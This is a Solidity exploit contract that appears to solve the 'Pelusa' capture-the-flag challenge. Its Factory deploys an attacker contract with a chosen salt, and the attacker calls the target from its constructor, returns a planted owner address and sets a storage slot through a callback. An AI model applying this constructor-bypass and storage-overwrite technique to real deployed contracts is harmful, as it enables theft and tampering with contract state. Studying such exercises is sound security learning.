// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Pelusa.sol";

contract Factory {
    function deploy(
        address _victim,
        address _owner,
        bytes32 salt
    ) external {
        new PelusaAttacker{salt: salt}(_victim, _owner);
    }
}

contract PelusaAttacker {
    address private immutable owner;

    address internal player;

    uint256 public goals = 1;

    constructor(address _victimAddress, address _owner) {
        Pelusa target = Pelusa(_victimAddress);
        owner = _owner;

        target.passTheBall();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    function handOfGod() external returns (bytes32) {
        goals = 2;
        return bytes32(uint256(22_06_1986));
    }
}
